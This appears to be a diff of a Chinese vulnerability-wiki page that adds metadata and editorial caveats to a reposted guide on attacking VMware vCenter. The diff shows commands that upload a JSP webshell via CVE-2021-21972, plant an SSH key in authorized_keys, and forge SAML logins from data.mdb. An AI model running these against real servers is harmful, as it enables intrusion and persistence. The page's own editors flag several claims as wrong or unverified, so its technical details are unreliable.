@@ -1,8 +1,58 @@
 ---
-cve: "CVE-2021-21980"
+title: "集权系统 Vcenter 打法总结"
+product: "VMware vCenter Server"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: "CVE-2021-21980"
+identifier_role: "reference"
+source_url: "https://mp.weixin.qq.com/s/i2c_t5barqgpqwvqERWq3A"
+source_status: "recorded"
+prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
+side_effects: "含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。; 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。; 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
+id: "vw-24da588c9be8f408d2d693c3"
+entity_id: "ve-24da588c9be8f408d2d693c3"
+schema_version: "1"
 ---
 
 # 集权系统 Vcenter 打法总结
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+
+### 本次正文校订
+
+- 按实际内容修正 4 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 元数据只21980漏多独立CVE
+- 22005影响范围明显复制21985且把6.5列受影响与单篇不受影响冲突
+- 21972混ESXi产品漏洞版本
+- CloudFoundation4.x<3.10.2.1分支错误
+- data.mdb并非直接存cookie需签名证书生成SAML
+- public key误说私钥
+- 大部分Linux都有sudo提权过度概括
+- 代码弯引号、GET缺空格、固定外部DNSlog和注册表断行
+- 增账户写webshell快照重启需标修改与清理，未提供私信脚本不能当完整附件
+
+### 操作风险与资料使用
+
+- 含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/i2c_t5barqgpqwvqERWq3A)
@@ -119,7 +169,7 @@ VMware ESXi 6.5 系列 < ESXi650-202102101-SG
 
 https://github.com/horizon3ai/CVE-2021-21972
 
-```
+```shell
 python CVE-2021-21972.py -t x.x.x.x -p ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\gsl.jsp -o win -f gsl.jsp
 参数用法含义如下：
 -t （目标地址）
@@ -155,7 +205,7 @@ Windows 路径
 
 往目录../../home/vsphere-ui/.ssh/authorized_keys 写就行
 
-```
+```shell
 python3 CVE-2021-21972.py -t x.x.x.x -p /home/vsphere-ui/.ssh/authorized_keys -o unix -f id_rsa_2048.pub
 
 ```
@@ -419,7 +469,7 @@ linux
 
 利用脚本进行攻击：
 
-```
+```shell
 python vcenter_saml_login.py -t <目标机器内网ip> -p data.mdb
 
 ```
@@ -442,7 +492,7 @@ https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%976-vCenter
 
 与方法一的区别就是该脚本 vCenter_ExtraCertFromMdb.py 可以直接在目标 vcenter 上运行, 会生成证书！！！。
 
-```
+```shell
 python vCenter_ExtraCertFromMdb.py /storage/db/vmware-vmdir/data.mdb
 
 ```
